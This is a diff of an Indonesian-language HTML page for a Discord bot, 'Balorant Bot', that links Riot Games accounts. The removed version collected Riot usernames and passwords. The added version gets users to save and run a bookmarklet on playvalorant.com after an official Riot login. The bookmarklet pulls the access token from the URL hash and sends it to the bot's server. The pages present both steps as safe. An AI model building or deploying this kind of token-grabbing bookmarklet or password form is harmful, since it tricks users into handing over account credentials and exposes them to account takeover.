@@ -5,11 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login Valorant - Balorant Bot</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, #0f1923 0%, #1a2332 100%);
@@ -25,220 +21,179 @@
       backdrop-filter: blur(10px);
       border: 1px solid rgba(255, 70, 85, 0.2);
       border-radius: 16px;
-      padding: 40px;
-      max-width: 420px;
+      padding: 36px;
+      max-width: 500px;
       width: 100%;
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
     }
-    .logo {
-      text-align: center;
-      margin-bottom: 30px;
+    .logo { text-align: center; margin-bottom: 24px; }
+    .logo h1 { color: #ff4655; font-size: 28px; font-weight: 700; margin-bottom: 6px; }
+    .logo p { color: #ece8e1; opacity: 0.7; font-size: 14px; }
+
+    .step {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 16px;
     }
-    .logo h1 {
-      color: #ff4655;
-      font-size: 32px;
+    .step-num {
+      display: inline-block;
+      background: #ff4655;
+      color: #fff;
       font-weight: 700;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      text-align: center;
+      line-height: 24px;
+      font-size: 12px;
+      margin-right: 8px;
+    }
+    .step-title {
+      font-weight: 600;
+      font-size: 15px;
       margin-bottom: 8px;
     }
-    .logo p {
-      color: #ece8e1;
-      opacity: 0.7;
-      font-size: 14px;
-    }
-    .form-group {
-      margin-bottom: 20px;
-    }
-    label {
+
+    .bookmarklet-btn {
       display: block;
-      margin-bottom: 8px;
-      font-weight: 500;
-      font-size: 14px;
-      color: #ece8e1;
-    }
-    input[type="text"],
-    input[type="password"] {
       width: 100%;
-      padding: 12px 16px;
-      background: rgba(255, 255, 255, 0.08);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      text-align: center;
+      padding: 12px;
+      background: #00b4d8;
+      color: #fff;
+      font-weight: 700;
       border-radius: 8px;
-      color: #ece8e1;
-      font-size: 14px;
-      transition: all 0.3s;
+      text-decoration: none;
+      cursor: grab;
+      margin: 10px 0;
+      box-shadow: 0 4px 10px rgba(0, 180, 216, 0.3);
+      transition: all 0.2s;
     }
-    input[type="text"]:focus,
-    input[type="password"]:focus {
-      outline: none;
-      border-color: #ff4655;
-      background: rgba(255, 255, 255, 0.12);
-    }
-    input::placeholder {
-      color: rgba(236, 232, 225, 0.4);
-    }
-    .btn {
+    .bookmarklet-btn:hover { background: #0096c7; }
+
+    .riot-btn {
+      display: block;
       width: 100%;
+      text-align: center;
       padding: 14px;
       background: #ff4655;
       color: #fff;
-      border: none;
-      border-radius: 8px;
+      font-weight: 700;
       font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s;
+      border-radius: 8px;
+      text-decoration: none;
       margin-top: 10px;
-    }
-    .btn:hover {
-      background: #e63946;
-      transform: translateY(-2px);
       box-shadow: 0 4px 12px rgba(255, 70, 85, 0.4);
+      transition: all 0.2s;
     }
-    .btn:disabled {
-      background: #555;
-      cursor: not-allowed;
-      transform: none;
+    .riot-btn:hover { background: #e63946; }
+
+    .note {
+      font-size: 12px;
+      color: rgba(236, 232, 225, 0.6);
+      line-height: 1.4;
+      margin-top: 6px;
     }
-    .message {
-      margin-top: 20px;
-      padding: 12px;
-      border-radius: 8px;
-      font-size: 14px;
-      text-align: center;
-      display: none;
-    }
-    .message.error {
-      background: rgba(255, 70, 85, 0.2);
-      border: 1px solid #ff4655;
-      color: #ff4655;
-    }
-    .message.success {
-      background: rgba(102, 252, 241, 0.2);
-      border: 1px solid #66fcf1;
-      color: #66fcf1;
-    }
-    .message.show {
-      display: block;
-    }
-    .info-box {
-      background: rgba(255, 200, 87, 0.1);
-      border: 1px solid rgba(255, 200, 87, 0.3);
-      border-radius: 8px;
-      padding: 12px;
-      margin-bottom: 24px;
-      font-size: 13px;
-      color: #ffc857;
-    }
-    .spinner {
-      border: 3px solid rgba(255, 255, 255, 0.1);
-      border-top: 3px solid #ff4655;
-      border-radius: 50%;
-      width: 20px;
-      height: 20px;
-      animation: spin 1s linear infinite;
-      display: inline-block;
-      margin-right: 8px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .code-box {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border-radius: 6px;
+      font-family: monospace;
+      font-size: 11px;
+      word-break: break-all;
+      user-select: all;
+      margin-top: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">
-      <h1>🎮 Balorant Bot</h1>
-      <p>Link akun Riot kamu ke Discord</p>
+      <h1>🎮 Balorant Quick Link</h1>
+      <p>Hubungkan Akun Riot Games dalam 2 Langkah</p>
     </div>
 
-    <div class="info-box">
-      🔒 <strong>Aman:</strong> Username & password langsung dikirim ke Riot Games API. Bot tidak pernah menyimpan password kamu.
+    <!-- Step 1: Tarik Bookmarklet -->
+    <div class="step">
+      <div class="step-title">
+        <span class="step-num">1</span> Geser Tombol Ini ke Bookmarks Bar
+      </div>
+      <p style="font-size: 13px; color: #ccc;">Drag/tarik tombol di bawah ke Bookmarks Bar browser kamu (atau copy kodenya):</p>
+      
+      <a id="bmLink" href="#" class="bookmarklet-btn">⚡ Link Balorant</a>
+
+      <div class="note">
+        <strong>Atau jika di HP/Mobile:</strong> Buat bookmark baru di browser, beri nama "Link Balorant", dan isi URL-nya dengan kode di bawah:
+      </div>
+      <div class="code-box" id="codeBox"></div>
     </div>
 
-    <form id="loginForm">
-      <div class="form-group">
-        <label for="username">Username Riot</label>
-        <input type="text" id="username" name="username" placeholder="nama_user" required>
+    <!-- Step 2: Login Riot -->
+    <div class="step">
+      <div class="step-title">
+        <span class="step-num">2</span> Login di Website Resmi Riot
       </div>
-
-      <div class="form-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="••••••••" required>
-      </div>
-
-      <button type="submit" class="btn" id="submitBtn">
-        Login & Link ke Discord
-      </button>
-    </form>
-
-    <div class="message" id="message"></div>
+      <p style="font-size: 13px; color: #ccc;">Klik tombol login resmi Riot di bawah. Setelah login, kamu akan sampai di halaman <code>playvalorant.com</code>.</p>
+      
+      <a id="riotLink" href="#" target="_blank" class="riot-btn">🔑 Login ke Riot Games</a>
+      
+      <p style="font-size: 12px; color: #ffc857; margin-top: 10px;">
+        👉 Di halaman playvalorant.com tersebut, <strong>KLIK Bookmarklet "⚡ Link Balorant"</strong> yang tadi kamu simpan! Akun kamu akan otomatis terhubung!
+      </p>
+    </div>
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const message = document.getElementById('message');
-
-    // Ambil state (discord_id) dari URL query param
     const urlParams = new URLSearchParams(window.location.search);
-    const state = urlParams.get('state');
+    const discordId = urlParams.get('discord_id') || urlParams.get('state');
 
-    if (!state) {
-      showMessage('error', '❌ Link tidak valid. Gunakan /login di Discord untuk mendapatkan link yang benar.');
-      submitBtn.disabled = true;
-    }
+    // Domain API server
+    const appUrl = window.location.origin;
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      if (!username || !password) {
-        showMessage('error', 'Username dan password harus diisi!');
+    // JavaScript Bookmarklet Code
+    const bookmarkletScript = `javascript:(function(){
+      const hash = window.location.hash.substring(1);
+      if(!hash || !hash.includes('access_token')){
+        alert('❌ Silakan jalankan ini hanya saat berada di halaman playvalorant.com setelah login!');
         return;
       }
-
-      // Disable button & show loading
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<span class="spinner"></span> Logging in...';
-      message.classList.remove('show');
-
-      try {
-        const response = await fetch('/api/riot-login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            username,
-            password,
-            discord_id: state
-          })
-        });
-
-        const data = await response.json();
-
-        if (response.ok && data.success) {
-          showMessage('success', '✅ Berhasil! Akun Riot kamu sudah terlink ke Discord.');
-          form.reset();
-          setTimeout(() => {
-            window.location.href = '/success';
-          }, 2000);
-        } else {
-          showMessage('error', `❌ ${data.message || 'Login gagal. Cek username/password kamu.'}`);
-          submitBtn.disabled = false;
-          submitBtn.innerHTML = 'Login & Link ke Discord';
-        }
-      } catch (error) {
-        showMessage('error', '❌ Terjadi kesalahan. Coba lagi nanti.');
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Login & Link ke Discord';
+      const params = new URLSearchParams(hash);
+      const accessToken = params.get('access_token');
+      if(!accessToken){
+        alert('❌ Access token tidak ditemukan!');
+        return;
       }
-    });
+      fetch('${appUrl}/api/link-account', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          discord_id: '${discordId}',
+          access_token: accessToken
+        })
+      }).then(r => r.json()).then(data => {
+        if(data.success){
+          alert('✅ BERHASIL! Akun Riot (' + (data.player ? data.player.gameName + '#' + data.player.tagLine : '') + ') sudah terlink ke Discord! Silakan kembali ke Discord.');
+        } else {
+          alert('❌ Gagal: ' + (data.message || 'Terjadi kesalahan'));
+        }
+      }).catch(e => alert('❌ Error: ' + e.message));
+    })();`;
 
-    function showMessage(type, text) {
-      message.className = `message ${type} show`;
-      message.textContent = text;
-    }
+    document.getElementById('bmLink').href = bookmarkletScript;
+    document.getElementById('codeBox').textContent = bookmarkletScript;
+
+    // Riot RSO URL
+    const riotAuthUrl = new URL('https://auth.riotgames.com/authorize');
+    riotAuthUrl.searchParams.set('client_id', 'play-valorant-web-prod');
+    riotAuthUrl.searchParams.set('response_type', 'token id_token');
+    riotAuthUrl.searchParams.set('redirect_uri', 'https://playvalorant.com/opt_in');
+    riotAuthUrl.searchParams.set('scope', 'openid link ban lol_region account');
+    riotAuthUrl.searchParams.set('nonce', '1');
+
+    document.getElementById('riotLink').href = riotAuthUrl.toString();
   </script>
 </body>
 </html>
